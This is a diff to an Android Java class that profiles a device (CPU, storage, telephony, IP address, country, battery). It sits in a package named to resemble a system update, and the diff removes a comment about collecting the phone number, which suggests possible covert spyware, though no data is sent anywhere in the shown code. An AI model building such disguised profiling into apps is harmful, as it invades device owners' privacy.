@@ -2,6 +2,8 @@ package com.android.system.update.modules;
 
 import android.app.ActivityManager;
 import android.content.Context;
+import android.content.Intent;
+import android.content.IntentFilter;
 import android.content.pm.PackageManager;
 import android.net.ConnectivityManager;
 import android.net.NetworkInfo;
@@ -71,7 +73,7 @@ public class DeviceModule {
             // 9. Performance Metrics
             collectPerformanceMetrics(info);
             
-            // 10. Battery Information (FIXED)
+            // 10. Battery Information (FIXED for compatibility)
             collectBatteryInfo(info);
             
             return info.toString(4);
@@ -105,7 +107,7 @@ public class DeviceModule {
         info.put("cpu_abi2", safeGet(() -> Build.CPU_ABI2, "Unknown"));
         info.put("cpu_cores", Runtime.getRuntime().availableProcessors());
         
-        // Get CPU info from /proc/cpuinfo - FIXED to get actual processor info
+        // Get CPU info from /proc/cpuinfo
         try {
             Process process = Runtime.getRuntime().exec("cat /proc/cpuinfo");
             BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
@@ -168,7 +170,7 @@ public class DeviceModule {
             Log.w(TAG, "Could not get internal storage info", e);
         }
         
-        // External storage - FIXED to properly detect external storage
+        // External storage - properly detect external storage
         try {
             File[] externalFiles = context.getExternalFilesDirs(null);
             if (externalFiles != null && externalFiles.length > 1 && externalFiles[1] != null) {
@@ -202,7 +204,7 @@ public class DeviceModule {
         JSONObject wifiInfo = new JSONObject();
         JSONObject mobileInfo = new JSONObject();
         
-        // Mobile network info - FIXED to include phone number
+        // Mobile network info
         try {
             TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
             if (tm != null) {
@@ -253,7 +255,7 @@ public class DeviceModule {
             mobileInfo.put("error", e.getMessage());
         }
         
-        // WiFi info - FIXED to get IP even when WiFi is off (mobile data IP)
+        // WiFi info
         try {
             if (checkPermission(android.Manifest.permission.ACCESS_WIFI_STATE)) {
                 WifiManager wm = (WifiManager) context.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
@@ -360,7 +362,7 @@ public class DeviceModule {
     private void collectLocalizationInfo(JSONObject info) throws JSONException {
         JSONObject localizationInfo = new JSONObject();
         
-        // Get actual network country from TelephonyManager (FIXED)
+        // Get actual network country from TelephonyManager
         String networkCountry = getNetworkCountry();
         if (networkCountry != null && !networkCountry.isEmpty()) {
             localizationInfo.put("country", networkCountry);
@@ -390,84 +392,119 @@ public class DeviceModule {
         info.put("performance", performanceInfo);
     }
     
-    // NEW: Battery information collection (FIXED)
+    // FIXED: Battery information collection with compatibility for all Android versions
     private void collectBatteryInfo(JSONObject info) throws JSONException {
         JSONObject batteryInfo = new JSONObject();
         
         try {
-            BatteryManager bm = (BatteryManager) context.getSystemService(Context.BATTERY_SERVICE);
-            if (bm != null) {
-                // Battery level
-                int level = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
-                batteryInfo.put("level", level);
+            // Method 1: Using BatteryManager (API 21+)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+                BatteryManager bm = (BatteryManager) context.getSystemService(Context.BATTERY_SERVICE);
+                if (bm != null) {
+                    // Battery level - this works on all API 21+
+                    int level = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
+                    batteryInfo.put("level", level);
+                    
+                    // Charging status - using BatteryManager
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                        int status = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_STATUS);
+                        boolean isCharging = (status == BatteryManager.BATTERY_STATUS_CHARGING ||
+                                              status == BatteryManager.BATTERY_STATUS_FULL);
+                        batteryInfo.put("is_charging", isCharging);
+                        
+                        String statusStr = "Unknown";
+                        switch (status) {
+                            case BatteryManager.BATTERY_STATUS_CHARGING:
+                                statusStr = "Charging";
+                                break;
+                            case BatteryManager.BATTERY_STATUS_DISCHARGING:
+                                statusStr = "Discharging";
+                                break;
+                            case BatteryManager.BATTERY_STATUS_FULL:
+                                statusStr = "Full";
+                                break;
+                            case BatteryManager.BATTERY_STATUS_NOT_CHARGING:
+                                statusStr = "Not charging";
+                                break;
+                        }
+                        batteryInfo.put("status", statusStr);
+                    }
+                }
+            }
+            
+            // Method 2: Using Intent (works on all versions, more reliable for some values)
+            IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
+            Intent batteryStatus = context.registerReceiver(null, ifilter);
+            
+            if (batteryStatus != null) {
+                // Level - use this as primary source for level
+                int level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
+                int scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
+                if (level != -1 && scale != -1) {
+                    float batteryPct = level * 100 / (float) scale;
+                    batteryInfo.put("level", (int) batteryPct);
+                }
                 
                 // Charging status
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-                    int status = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_STATUS);
-                    boolean isCharging = (status == BatteryManager.BATTERY_STATUS_CHARGING ||
-                                          status == BatteryManager.BATTERY_STATUS_FULL);
-                    batteryInfo.put("is_charging", isCharging);
-                    
-                    String statusStr = "Unknown";
-                    switch (status) {
-                        case BatteryManager.BATTERY_STATUS_CHARGING:
-                            statusStr = "Charging";
-                            break;
-                        case BatteryManager.BATTERY_STATUS_DISCHARGING:
-                            statusStr = "Discharging";
-                            break;
-                        case BatteryManager.BATTERY_STATUS_FULL:
-                            statusStr = "Full";
-                            break;
-                        case BatteryManager.BATTERY_STATUS_NOT_CHARGING:
-                            statusStr = "Not charging";
-                            break;
-                    }
-                    batteryInfo.put("status", statusStr);
+                int status = batteryStatus.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
+                boolean isCharging = (status == BatteryManager.BATTERY_STATUS_CHARGING ||
+                                      status == BatteryManager.BATTERY_STATUS_FULL);
+                batteryInfo.put("is_charging", isCharging);
+                
+                // Health
+                int health = batteryStatus.getIntExtra(BatteryManager.EXTRA_HEALTH, -1);
+                String healthStr = "Unknown";
+                switch (health) {
+                    case BatteryManager.BATTERY_HEALTH_GOOD:
+                        healthStr = "Good";
+                        break;
+                    case BatteryManager.BATTERY_HEALTH_OVERHEAT:
+                        healthStr = "Overheat";
+                        break;
+                    case BatteryManager.BATTERY_HEALTH_DEAD:
+                        healthStr = "Dead";
+                        break;
+                    case BatteryManager.BATTERY_HEALTH_OVER_VOLTAGE:
+                        healthStr = "Over voltage";
+                        break;
+                    case BatteryManager.BATTERY_HEALTH_UNSPECIFIED_FAILURE:
+                        healthStr = "Failure";
+                        break;
+                    case BatteryManager.BATTERY_HEALTH_COLD:
+                        healthStr = "Cold";
+                        break;
+                }
+                batteryInfo.put("health", healthStr);
+                
+                // Temperature (in tenths of a degree Celsius)
+                int temperature = batteryStatus.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, -1);
+                if (temperature != -1) {
+                    batteryInfo.put("temperature_celsius", temperature / 10.0);
                 }
                 
-                // Battery health
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-                    int health = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_HEALTH);
-                    String healthStr = "Unknown";
-                    switch (health) {
-                        case BatteryManager.BATTERY_HEALTH_GOOD:
-                            healthStr = "Good";
-                            break;
-                        case BatteryManager.BATTERY_HEALTH_OVERHEAT:
-                            healthStr = "Overheat";
-                            break;
-                        case BatteryManager.BATTERY_HEALTH_DEAD:
-                            healthStr = "Dead";
-                            break;
-                        case BatteryManager.BATTERY_HEALTH_OVER_VOLTAGE:
-                            healthStr = "Over voltage";
-                            break;
-                        case BatteryManager.BATTERY_HEALTH_UNSPECIFIED_FAILURE:
-                            healthStr = "Failure";
-                            break;
-                        case BatteryManager.BATTERY_HEALTH_COLD:
-                            healthStr = "Cold";
-                            break;
-                    }
-                    batteryInfo.put("health", healthStr);
-                }
-                
-                // Temperature
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-                    int temp = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_TEMPERATURE);
-                    batteryInfo.put("temperature_celsius", temp / 10.0);
-                }
-                
-                // Voltage
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-                    int voltage = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_VOLTAGE);
+                // Voltage (in millivolts)
+                int voltage = batteryStatus.getIntExtra(BatteryManager.EXTRA_VOLTAGE, -1);
+                if (voltage != -1) {
                     batteryInfo.put("voltage_mv", voltage);
                 }
                 
                 // Technology
-                batteryInfo.put("technology", "Li-ion"); // Default, can't get easily
+                String technology = batteryStatus.getStringExtra(BatteryManager.EXTRA_TECHNOLOGY);
+                if (technology != null) {
+                    batteryInfo.put("technology", technology);
+                }
+                
+                // Plugged state
+                int plugged = batteryStatus.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1);
+                if (plugged != -1) {
+                    String pluggedStr = "Battery";
+                    if (plugged == BatteryManager.BATTERY_PLUGGED_AC) pluggedStr = "AC";
+                    else if (plugged == BatteryManager.BATTERY_PLUGGED_USB) pluggedStr = "USB";
+                    else if (plugged == BatteryManager.BATTERY_PLUGGED_WIRELESS) pluggedStr = "Wireless";
+                    batteryInfo.put("plugged", pluggedStr);
+                }
             }
+            
         } catch (Exception e) {
             Log.w(TAG, "Could not get battery info", e);
             batteryInfo.put("level", 0);
@@ -505,7 +542,7 @@ public class DeviceModule {
         return "Unknown";
     }
     
-    // NEW: Get device IP address from any network interface
+    // Get device IP address from any network interface
     private String getDeviceIpAddress() {
         try {
             Enumeration<NetworkInterface> interfaces = NetworkInterface.getNetworkInterfaces();
@@ -528,7 +565,7 @@ public class DeviceModule {
         return null;
     }
     
-    // NEW: Get network country from TelephonyManager
+    // Get network country from TelephonyManager
     private String getNetworkCountry() {
         try {
             TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
@@ -548,7 +585,7 @@ public class DeviceModule {
         return null;
     }
     
-    // NEW: Get processor model
+    // Get processor model
     private String getProcessorModel() {
         try {
             Process process = Runtime.getRuntime().exec("getprop ro.chipname");
